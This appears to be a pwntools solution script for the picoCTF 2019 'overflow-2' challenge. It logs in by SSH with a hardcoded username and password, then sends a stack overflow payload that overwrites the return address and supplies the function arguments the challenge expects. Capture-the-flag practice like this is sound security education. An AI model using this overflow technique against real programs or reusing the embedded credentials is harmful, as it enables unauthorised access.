#coding=utf-8
from pwn import *

debug = 0
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446')
    p = s.process('./vuln')

target = 0x080485e6 
vuln = 0x08048676
buf = 0xffffd400
ret = 0xffffd4bc
p.sendline('a' * (ret - buf) + p32(target) + 'aaaa' + p32(0xdeadbeef) + p32(0xc0ded00d))
print p.recvall(1)
